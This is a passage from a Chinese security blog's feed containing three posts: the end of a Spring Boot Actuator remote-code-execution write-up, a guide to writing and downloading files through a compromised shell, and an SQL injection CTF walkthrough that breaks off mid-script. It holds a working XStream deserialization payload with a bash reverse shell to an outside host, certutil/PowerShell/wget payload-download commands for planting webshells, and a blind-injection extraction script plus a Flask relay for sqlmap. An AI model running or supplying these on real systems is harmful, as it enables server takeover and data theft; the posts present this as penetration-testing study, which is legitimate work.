&lt;command&gt;</span></span><br><span class="line"><span class="string">                    &lt;string&gt;bash&lt;/string&gt;</span></span><br><span class="line"><span class="string">                      &lt;string&gt;-c&lt;/string&gt;</span></span><br><span class="line"><span class="string">                      &lt;string&gt;bash -i &gt;/dev/tcp/1.1.1.1/50101 0&gt;&amp;amp;1&lt;/string&gt;</span></span><br><span class="line"><span class="string">                    &lt;/command&gt;</span></span><br><span class="line"><span class="string">                    &lt;redirectErrorStream&gt;false&lt;/redirectErrorStream&gt;</span></span><br><span class="line"><span class="string">                  &lt;/next&gt;</span></span><br><span class="line"><span class="string">                &lt;/iter&gt;</span></span><br><span class="line"><span class="string">                &lt;filter class=&quot;javax.imageio.ImageIO$ContainsFilter&quot;&gt;</span></span><br><span class="line"><span class="string">                  &lt;method&gt;</span></span><br><span class="line"><span class="string">                    &lt;class&gt;java.lang.ProcessBuilder&lt;/class&gt;</span></span><br><span class="line"><span class="string">                    &lt;name&gt;start&lt;/name&gt;</span></span><br><span class="line"><span class="string">                    &lt;parameter-types/&gt;</span></span><br><span class="line"><span class="string">                  &lt;/method&gt;</span></span><br><span class="line"><span class="string">                  &lt;name&gt;foo&lt;/name&gt;</span></span><br><span class="line"><span class="string">                &lt;/filter&gt;</span></span><br><span class="line"><span class="string">                &lt;next class=&quot;string&quot;&gt;foo&lt;/next&gt;</span></span><br><span class="line"><span class="string">              &lt;/serviceIterator&gt;</span></span><br><span class="line"><span class="string">              &lt;lock/&gt;</span></span><br><span class="line"><span class="string">            &lt;/cipher&gt;</span></span><br><span class="line"><span class="string">            &lt;input class=&quot;java.lang.ProcessBuilder$NullInputStream&quot;/&gt;</span></span><br><span class="line"><span class="string">            &lt;ibuffer&gt;&lt;/ibuffer&gt;</span></span><br><span class="line"><span class="string">          &lt;/is&gt;</span></span><br><span class="line"><span class="string">        &lt;/dataSource&gt;</span></span><br><span class="line"><span class="string">      &lt;/dataHandler&gt;</span></span><br><span class="line"><span class="string">    &lt;/value&gt;</span></span><br><span class="line"><span class="string">  &lt;/jdk.nashorn.internal.objects.NativeString&gt;</span></span><br><span class="line"><span class="string">&lt;/linked-hash-set&gt;&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> Response(xml, mimetype=<span class="string">&#x27;application/xml&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">50102</span>)</span><br></pre></td></tr></table></figure>

<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>首先把exp报错为<code>exp.py</code>文件，然后修改第22行的ip地址为接收反弹shell的ip，然后运行<code>exp.py</code>：<br><img data-src="/2020/06/05/Spring-Boot-Actuators%E6%9C%AA%E6%8E%88%E6%9D%83GetShell/2020-08-20-19-43-34.png"></p>
<p>配置<code>eureka.client.serviceUrl.defaultZone=http://1.1.1.1:50102/xstream</code>，其中的ip地址为<code>exp.py</code>监听的地址：<br><img data-src="/2020/06/05/Spring-Boot-Actuators%E6%9C%AA%E6%8E%88%E6%9D%83GetShell/2020-08-20-19-45-25.png"></p>
<p>然后通过<code>refresh</code>端点刷新，靶机将通过刚刚在<code>env</code>配置的<code>eureka.client.serviceUrl.defaultZone</code>路径发起请求，获取恶意XML文件：<br><img data-src="/2020/06/05/Spring-Boot-Actuators%E6%9C%AA%E6%8E%88%E6%9D%83GetShell/2020-08-20-19-48-27.png"></p>
<p><code>exp.py</code>接收到靶机发起的请求：<br><img data-src="/2020/06/05/Spring-Boot-Actuators%E6%9C%AA%E6%8E%88%E6%9D%83GetShell/2020-08-20-19-49-49.png"></p>
<p>获得反弹shell：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">socat tcp<span class="_">-l</span>:50101,fork,reuseaddr -</span><br></pre></td></tr></table></figure>
<p><img data-src="/2020/06/05/Spring-Boot-Actuators%E6%9C%AA%E6%8E%88%E6%9D%83GetShell/2020-08-20-19-50-54.png"></p>
<p><strong>注意：</strong> <code>http://1.1.1.1:50102/xstream</code>返回的是<code>application/xml</code>格式数据，否则服务端不认，所以需要运行<code>exp.py</code>来做服务。</p>
<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://www.freebuf.com/news/193509.html">Springboot之actuator配置不当的漏洞利用</a><br><a href="https://jianfensec.com/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Spring%20Boot%20Actuators%E9%85%8D%E7%BD%AE%E4%B8%8D%E5%BD%93%E5%AF%BC%E8%87%B4RCE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">Spring Boot Actuators配置不当导致RCE漏洞复现</a></p>
]]></content>
      <categories>
        <category>漏洞</category>
      </categories>
      <tags>
        <tag>漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title>SHELL写文件的几种方式</title>
    <url>/2019/08/15/SHELL%E5%86%99%E6%96%87%E4%BB%B6%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E5%BC%8F/</url>
    <content><![CDATA[<p><strong>本文仅作为技术讨论及分享，严禁用于任何非法用途。</strong></p>
<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>本文总结了一些通过<code>cmd</code>或者<code>bash</code>等<code>shell</code>写文件的方法，如在某些情况下，拿到了<code>cmd shell</code>或者<code>bash shell</code>，如下图：<br><img data-src="/2019/08/15/SHELL%E5%86%99%E6%96%87%E4%BB%B6%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E5%BC%8F/2020-08-20-17-00-21.png"></p>
<p>但是靶机无法上公网和反连攻击机，然后通过<code>echo</code>等方式写<code>shell</code>的方法。受限于本人有限的知识面以及实用性等考量，这里列出的方法并不全面，仅供参考。</p>
<a id="more"></a>
<h3 id="Windows-下写文件"><a href="#Windows-下写文件" class="headerlink" title="Windows 下写文件"></a>Windows 下写文件</h3><h4 id="echo写文件"><a href="#echo写文件" class="headerlink" title="echo写文件"></a>echo写文件</h4><p>这是最原始的方法，比较折腾人。如果你以为只要<code>echo 1 &gt; 1.txt</code>这样写入，就图样了。Windows下的<code>cmd echo</code>写入需要特殊字符转义，如下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt; --- ^&lt;</span><br><span class="line">&gt; --- ^&gt;</span><br><span class="line">/ --- ^/</span><br><span class="line">+ --- ^+</span><br></pre></td></tr></table></figure>
<p>另外，由于web服务器自动转码<code>URL编码</code>，把原本不是URL编码的字符转码了，导致写入的文件错误，所以还需对下面的字符转码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">% --&gt; %25    # --&gt; %23    @ --&gt; %40</span><br><span class="line">+ --&gt; %2b    | --&gt; %7c    &amp; --&gt; ^%26</span><br></pre></td></tr></table></figure>
<p><code>冰蝎</code>马使用这种方法转码的效果如下：<br><img data-src="/2019/08/15/SHELL%E5%86%99%E6%96%87%E4%BB%B6%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E5%BC%8F/2020-08-20-17-02-27.png"><br>然后通过<code>echo &lt;转码后的payload&gt; &gt; path/xxx.ext</code>写入文件，示例如下：<br><img data-src="/2019/08/15/SHELL%E5%86%99%E6%96%87%E4%BB%B6%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E5%BC%8F/2020-08-20-17-02-56.png"><br>局限性：</p>
<ul>
<li><p>Echo 字符数量有限，依赖于具体的浏览器也依赖于 web 服务器，当然还有万恶的 IDS。</p>
</li>
<li><p>IE 在地址栏的字符数上限是 2048 个字符</p>
</li>
<li><p>Chrome 没有明显的上限, 超过 1M 的内容也可以轻松接受</p>
</li>
<li><p>Firefox 没有明显的上限, 超过 5M 的内容也可以轻松接受</p>
</li>
<li><p>LinuxWin tomcat jboss 接受的 URL 最大长度是 7800</p>
</li>
<li><p>Windows Tomcat URL7825</p>
</li>
<li><p>Windows PHP Apache URL 最大长度为 8193<br>IIS6 ASP URL 最大长度为 15973</p>
</li>
</ul>
<h4 id="certutil-base64解码写入"><a href="#certutil-base64解码写入" class="headerlink" title="certutil base64解码写入"></a>certutil base64解码写入</h4><p>上面提到<code>echo</code>写入万恶的转义问题，那么，通过base64编码是不是可以解决这烦人的转义问题呢？是的！<br>比如，我们要把<code>&lt;script&gt;alert(1)&lt;/script&gt;</code>（base64编码为：<code>PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==</code>）写入文件，可用如下方法：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg== &gt; 1.txt</span><br><span class="line">certutil.exe -decode 1.txt 2.jsp</span><br></pre></td></tr></table></figure>
<p>这时候<code>2.jsp</code>就是要写入的内容：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">cat 2.jsp</span><br><span class="line">&lt;script&gt;alert(1)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
<p>顺带一提，<code>certutil</code>下载文件的方法：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">certutil.exe -urlcache -split -f &lt;url&gt;</span><br><span class="line">示例：</span><br><span class="line">certutil.exe -urlcache -split -f http://192.168.245.130:8080/1.txt</span><br><span class="line">或者：</span><br><span class="line">certutil.exe -urlcache -split -f http://192.168.245.130:8080/1.txt 2.txt</span><br></pre></td></tr></table></figure>
<p>不幸的是，<strong>即使下载的不是有毒文件，杀软还是很可能会杀掉：</strong><br><img data-src="/2019/08/15/SHELL%E5%86%99%E6%96%87%E4%BB%B6%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E5%BC%8F/2020-08-20-17-05-57.png"><br><img data-src="/2019/08/15/SHELL%E5%86%99%E6%96%87%E4%BB%B6%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E5%BC%8F/2020-08-20-17-06-02.png"></p>
<h4 id="powershell-base64写入"><a href="#powershell-base64写入" class="headerlink" title="powershell base64写入"></a>powershell base64写入</h4><p><code>powershell</code>写入的方法就简单得多，如下：</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="variable">$data</span> = <span class="string">&#x27;PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==&#x27;</span></span><br><span class="line">[<span class="type">System.Text.Encoding</span>]::ASCII.GetString([<span class="type">System.Convert</span>]::FromBase64String(<span class="variable">$data</span>))</span><br></pre></td></tr></table></figure>
<p>效果如下，在后面加上重定向符即可写入文件:<br><img data-src="/2019/08/15/SHELL%E5%86%99%E6%96%87%E4%BB%B6%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E5%BC%8F/2020-08-20-17-06-50.png"></p>
<h4 id="powershell下载文件"><a href="#powershell下载文件" class="headerlink" title="powershell下载文件"></a>powershell下载文件</h4><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">打印远程文件到控制台：  </span><br><span class="line">(<span class="built_in">New-Object</span> Net.WebClient).DownloadString(<span class="string">&#x27;http://192.168.245.130:8080/1.txt&#x27;</span>)</span><br><span class="line">或者：</span><br><span class="line">powershell <span class="literal">-c</span> (<span class="built_in">New-Object</span> Net.WebClient).DownloadString(<span class="string">&#x27;http://192.168.245.130:8080/1.txt&#x27;</span>)</span><br><span class="line">直接下载文件：  </span><br><span class="line">(<span class="built_in">New-Object</span> Net.WebClient).DownloadFileAsync(<span class="string">&#x27;http://192.168.245.130:8080/1.txt&#x27;</span>, <span class="string">&#x27;1.txt&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p><img data-src="/2019/08/15/SHELL%E5%86%99%E6%96%87%E4%BB%B6%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E5%BC%8F/2020-08-20-17-07-43.png"></p>
<h3 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h3><p>因为Linux一般都自带base64命令，这里就不讨论转义的问题了。</p>
<h4 id="bash-base64写入"><a href="#bash-base64写入" class="headerlink" title="bash base64写入"></a>bash base64写入</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg== |base64 -d &gt; 1.txt</span><br></pre></td></tr></table></figure>

<h4 id="wget-下载"><a href="#wget-下载" class="headerlink" title="wget 下载"></a>wget 下载</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wget http://192.168.245.130:8080/1.txt -O 1.jsp</span><br></pre></td></tr></table></figure>

<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="http://rinige.com/index.php/archives/794/">CMD SHELL ECHO 写文件</a><br><a href="https://codeday.me/bug/20190305/738026.html">用powershell解码base64</a></p>
]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
      </tags>
  </entry>
  <entry>
    <title>SQL注入进阶:FLASK加工中转SQLMAP流量</title>
    <url>/2020/08/26/SQL%E6%B3%A8%E5%85%A5%E8%BF%9B%E9%98%B6-FLASK%E5%8A%A0%E5%B7%A5%E4%B8%AD%E8%BD%ACSQLMAP%E6%B5%81%E9%87%8F/</url>
    <content><![CDATA[<p><strong>本文仅作为技术讨论及分享，严禁用于任何非法用途。</strong></p>
<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>在渗透工作中我们经常能碰到一些逻辑复杂的SQL注入漏洞，并不能直接通过sqlmap工具注入拿到结果。今年网鼎杯的一道SQL注入题“张三的网站”让我久久不能忘怀，我不断思考遇到这类型的SQL注入除了手工注入然后编写脚本一点一点脱数据以外，有没有一个比较优雅的解决方案呢？</p>
<h3 id="一道CTF题的思考"><a href="#一道CTF题的思考" class="headerlink" title="一道CTF题的思考"></a>一道CTF题的思考</h3><p>先来说说“张三的网站”这道题目，因为我手上没有题目源码，所以就根据记忆中的各个功能自己写了一个（很少写php，代码很烂），相关代码已经上传到GitHub，见文章底部。</p>
<a id="more"></a>
<p>该题目主要涉及3个页面：</p>
<ol>
<li>登陆页面<br><img data-src="/2020/08/26/SQL%E6%B3%A8%E5%85%A5%E8%BF%9B%E9%98%B6-FLASK%E5%8A%A0%E5%B7%A5%E4%B8%AD%E8%BD%ACSQLMAP%E6%B5%81%E9%87%8F/2020-07-17-10-23-16.png"></li>
<li>注册页面<br><img data-src="/2020/08/26/SQL%E6%B3%A8%E5%85%A5%E8%BF%9B%E9%98%B6-FLASK%E5%8A%A0%E5%B7%A5%E4%B8%AD%E8%BD%ACSQLMAP%E6%B5%81%E9%87%8F/2020-07-17-10-23-38.png"></li>
<li>登陆后的主页<br><img data-src="/2020/08/26/SQL%E6%B3%A8%E5%85%A5%E8%BF%9B%E9%98%B6-FLASK%E5%8A%A0%E5%B7%A5%E4%B8%AD%E8%BD%ACSQLMAP%E6%B5%81%E9%87%8F/2020-07-17-10-26-22.png"></li>
</ol>
<p>题目中的登陆页面、注册页面均无SQL注入漏洞，但是登陆后的主页在用户名处存在SQL注入漏洞。要利用此漏洞，需要在注册页面控制用户名，邮箱使用随机数生成的邮箱，密码随意，然后使用邮箱和注册时的密码登陆，登陆成功后跳转到主页，此时触发SQL注入漏洞。<br>注册名为“123”的用户：<br><img data-src="/2020/08/26/SQL%E6%B3%A8%E5%85%A5%E8%BF%9B%E9%98%B6-FLASK%E5%8A%A0%E5%B7%A5%E4%B8%AD%E8%BD%ACSQLMAP%E6%B5%81%E9%87%8F/2020-07-17-10-55-42.png"><br><img data-src="/2020/08/26/SQL%E6%B3%A8%E5%85%A5%E8%BF%9B%E9%98%B6-FLASK%E5%8A%A0%E5%B7%A5%E4%B8%AD%E8%BD%ACSQLMAP%E6%B5%81%E9%87%8F/2020-07-17-10-57-53.png"><br><img data-src="/2020/08/26/SQL%E6%B3%A8%E5%85%A5%E8%BF%9B%E9%98%B6-FLASK%E5%8A%A0%E5%B7%A5%E4%B8%AD%E8%BD%ACSQLMAP%E6%B5%81%E9%87%8F/2020-07-17-10-58-04.png"><br>注册名为“123’”的用户：<br><img data-src="/2020/08/26/SQL%E6%B3%A8%E5%85%A5%E8%BF%9B%E9%98%B6-FLASK%E5%8A%A0%E5%B7%A5%E4%B8%AD%E8%BD%ACSQLMAP%E6%B5%81%E9%87%8F/2020-07-17-10-40-25.png"><br><img data-src="/2020/08/26/SQL%E6%B3%A8%E5%85%A5%E8%BF%9B%E9%98%B6-FLASK%E5%8A%A0%E5%B7%A5%E4%B8%AD%E8%BD%ACSQLMAP%E6%B5%81%E9%87%8F/2020-07-17-10-40-35.png"></p>
<p>以下是一个Python脚本手工注入的解法：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">proxy = &#123;<span class="string">&#x27;http&#x27;</span>: <span class="string">&#x27;127.0.0.1:8080&#x27;</span>&#125;</span><br><span class="line">session = requests.session()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">register</span>(<span class="params">username, email, password=<span class="string">&#x27;123&#x27;</span></span>):</span></span><br><span class="line">    burp0_url = <span class="string">&quot;http://192.168.154.130:80/web/register.php&quot;</span></span><br><span class="line">    burp0_headers = &#123;<span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:75.0) Gecko/20100101 Firefox/75.0&quot;</span>, <span class="string">&quot;Accept&quot;</span>: <span class="string">&quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8&quot;</span>, <span class="string">&quot;Accept-Language&quot;</span>: <span class="string">&quot;zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2&quot;</span>, <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/x-www-form-urlencoded&quot;</span>, <span class="string">&quot;Origin&quot;</span>: <span class="string">&quot;http://192.168.154.130&quot;</span>, <span class="string">&quot;Connection&quot;</span>: <span class="string">&quot;close&quot;</span>, <span class="string">&quot;Referer&quot;</span>: <span class="string">&quot;http://192.168.154.130/web/register.php&quot;</span>, <span class="string">&quot;Upgrade-Insecure-Requests&quot;</span>: <span class="string">&quot;1&quot;</span>&#125;</span><br><span class="line">    burp0_data = &#123;<span class="string">&quot;name&quot;</span>: username, <span class="string">&quot;pw&quot;</span>: password, <span class="string">&quot;repw&quot;</span>: password, <span class="string">&quot;email&quot;</span>: email, <span class="string">&quot;submit&quot;</span>: <span class="string">&#x27;&#x27;</span>&#125;</span><br><span class="line">    r = session.post(burp0_url, headers=burp0_headers, data=burp0_data, proxies=proxy)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span>(<span class="params">email, password=<span class="string">&#x27;123&#x27;</span></span>):</span></span><br><span class="line">    burp0_url = <span class="string">&quot;http://192.168.154.130:80/web/login.php&quot;</span></span><br><span class="line">    burp0_headers = &#123;<span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:75.0) Gecko/20100101 Firefox/75.0&quot;</span>, <span class="string">&quot;Accept&quot;</span>: <span class="string">&quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8&quot;</span>, <span class="string">&quot;Accept-Language&quot;</span>: <span class="string">&quot;zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2&quot;</span>, <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/x-www-form-urlencoded&quot;</span>, <span class="string">&quot;Origin&quot;</span>: <span class="string">&quot;http://192.168.154.130&quot;</span>, <span class="string">&quot;Connection&quot;</span>: <span class="string">&quot;close&quot;</span>, <span class="string">&quot;Referer&quot;</span>: <span class="string">&quot;http://192.168.154.130/web/login.php&quot;</span>, <span class="string">&quot;Upgrade-Insecure-Requests&quot;</span>: <span class="string">&quot;1&quot;</span>&#125;</span><br><span class="line">    burp0_data = &#123;<span class="string">&quot;email&quot;</span>: email, <span class="string">&quot;pw&quot;</span>: password, <span class="string">&quot;submit&quot;</span>: <span class="string">&#x27;&#x27;</span>&#125;</span><br><span class="line">    r1 = session.post(burp0_url, headers=burp0_headers, data=burp0_data, proxies=proxy)</span><br><span class="line">    <span class="comment"># 跳转首页</span></span><br><span class="line">    burp0_url = <span class="string">&quot;http://192.168.154.130/web/index.php&quot;</span></span><br><span class="line">    burp0_headers = &#123;<span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:75.0) Gecko/20100101 Firefox/75.0&quot;</span>, <span class="string">&quot;Accept&quot;</span>: <span class="string">&quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8&quot;</span>, <span class="string">&quot;Accept-Language&quot;</span>: <span class="string">&quot;zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2&quot;</span>, <span class="string">&quot;Referer&quot;</span>: <span class="string">&quot;http://a434051f6c184741b1ede6b610a15f805a546b5b172748e9.changame.ichunqiu.com/login.php&quot;</span>, <span class="string">&quot;Connection&quot;</span>: <span class="string">&quot;close&quot;</span>, <span class="string">&quot;Upgrade-Insecure-Requests&quot;</span>: <span class="string">&quot;1&quot;</span>&#125;</span><br><span class="line">    </span><br><span class="line">    r2 = session.get(burp0_url, headers=burp0_headers, proxies=proxy)</span><br><span class="line">    <span class="keyword">if</span> r2.status_code == <span class="number">302</span>:</span><br><span class="line">        print(<span class="string">&#x27;username payload no work&#x27;</span>)</span><br><span class="line">    <span class="keyword">elif</span> r2.status_code == <span class="number">200</span>:</span><br><span class="line">        pattern = <span class="string">&#x27;&#x27;&#x27;&lt;span class=&quot;user-name&quot;&gt;(.+?)&lt;/span&gt;&#x27;&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            userr = re.findall(pattern, r2.text, re.DOTALL)[<span class="number">0</span>]</span><br><span class="line">            <span class="keyword">if</span> userr:</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    key = string.ascii_lowercase + string.digits + <span class="string">&#x27;&#123;&#125;_-&#x27;</span></span><br><span class="line">    flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> keynum <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">43</span>):</span><br><span class="line">        <span class="keyword">for</span> s <span class="keyword">in</span> key:</span><br><span class="line">            username = <span class="string">r&quot;&quot;&quot;&#x27;or(substr((select e.a from (select (select 1)a union select * from flag)e limit 2 offset 1) from &#123;0&#125; for 1) = &#x27;&#123;1&#125;&#x27;) and &#x27;1&quot;&quot;&quot;</span>.format(keynum, s)</span><br><span class="line">            email = <span class="string">&#x27;&#123;&#125;@qq.com&#x27;</span>.format(int(random.random() * <span class="number">10000000</span>))</span><br><span class="line">            register(username, email)</span><br><span class="line">            <span class="keyword">if</span> login(email):</span><br><span class="line">                flag += s</span><br><span class="line">                print(<span class="string">&#x27;key: &#x27;</span> + flag)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">       </span><br><span class="line">    </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
<p>如果对ctf不熟悉的朋友应该会很懵，因为语句中直接查询获取了flag表中的内容，而正常情况下，我们是不知道真正的flag在上面表，这样的解法我个人觉得不具备通用性，当然了在ctf比赛中是很高效的。</p>
<p>那么，有没有可能通过sqlmap来进行注入呢？显然，直接使用sqlmap不进行二次开发是无法检测出注入点的，因为sqlmap的注入逻辑不支持多个数据包的逻辑处理。于是我在想有无一种办法，拿到sqlmap的注入检测payload，然后我们通过Python编写相应的请求逻辑，再把响应结果返回到sqlmap呢？答案是可行的！</p>
<h3 id="Flask中转sqlmap注入"><a href="#Flask中转sqlmap注入" class="headerlink" title="Flask中转sqlmap注入"></a>Flask中转sqlmap注入</h3><p>代码实现的结构如下，首先创建一个flask服务，接收<code>payload</code>参数的值，然后传入函数<code>custom_fun</code>中，<code>custom_fun</code>函数由自己编写请求逻辑，把<code>payload</code>参数的值填入到存在注入点的参数中，然后发起请求，把最终响应结果return就行。最后通过sqlmap检测URL：<code>http://127.0.0.1:5000/?payload=1</code>即可，可以适当调整sqlmap的注入参数，比如<code>--level</code>、<code>--risk</code>、<code>--technique</code>等。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">custom_fun</span>(<span class="params">payload</span>):</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"><span class="meta">@app.route(&#x27;/&#x27;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>():</span></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;GET&#x27;</span>:</span><br><span class="line">        payload = request.args.get(<span class="string">&#x27;payload&#x27;</span>)</span><br><span class="line">    <span class="keyword">elif</span>  request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        payload = request.form.get(<span class="string">&#x27;payload&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> custom_fun(payload)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    app.run(host=<span class="string">&#x27;127.0.0.1&#x27;</span>, debug=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

<p>流程示意图如下：<br><img data-src="/2020/08/26/SQL%E6%B3%A8%E5%85%A5%E8%BF%9B%E9%98%B6-FLASK%E5%8A%A0%E5%B7%A5%E4%B8%AD%E8%BD%ACSQLMAP%E6%B5%81%E9%87%8F/sql.drawio.png"></p>
<h3 id="完整注入过程"><a href="#完整注入过程" class="headerlink" title="完整注入过程"></a>完整注入过程</h3><p>先来看看本例的实现代码：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">custom_fun</span>(<span class="params">payload</span>):</span></span><br><span class="line">    email = <span class="string">&#x27;&#123;&#125;@qq.com&#x27;</span>.format(int(random.random() * <span class="number">10000000</span>))</span><br><span class="line">    username = payload</span><br><span class="line">    password = <span class="string">&#x27;123&#x27;</span></span><br><span class="line">    proxy = &#123;<span class="string">&#x27;http&#x27;</span>: <span class="string">&#x27;127.0.0.1:8080&#x27;</span>&#125;</span><br><span class="line">    session = requests.session()</span><br><span class="line">    <span class="comment"># 注册</span></span><br><span class="line">    burp0_url = <span class="string">&quot;http://192.168.154.130:80/web/register.php&quot;</span></span><br><span class="line">    burp0_headers = &#123;<span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:75.0) Gecko/20100101 Firefox/75.0&quot;</span>, <span class="string">&quot;Accept&quot;</span>: <span class="string">&quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8&quot;</span>, <span class="string">&quot;Accept-Language&quot;</span>: <span class="string">&quot;zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2&quot;</span>, <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/x-www-form-urlencoded&quot;</span>, <span class="string">&quot;Origin&quot;</span>: <span class="string">&quot;http://192.168.154.130&quot;</span>, <span class="string">&quot;Connection&quot;</span>: <span class="string">&quot;close&quot;</span>, <span class="string">&quot;Referer&quot;</span>: <span class="string">&quot;http://192.168.154.130/web/register.php&quot;</span>, <span class="string">&quot;Upgrade-Insecure-Requests&quot;</span>: <span class="string">&quot;1&quot;</span>&#125;</span><br><span class="line">    burp0_data = &#123;<span class="string">&quot;name&quot;</span>: username, <span class="string">&quot;pw&quot;</span>: password, <span class="string">&quot;repw&quot;</span>: password, <span class="string">&quot;email&quot;</span>: email, <span class="string">&quot;submit&quot;</span>: <span class="string">&#x27;&#x27;</span>&#125;</span><br><span class="line">    resp = session.post(burp0_url, headers=burp0_headers, data=burp0_data, proxies=proxy)</span><br><span class="line">    <span class="comment"># 登陆</span></span><br><span class="line">    burp0_url = <span 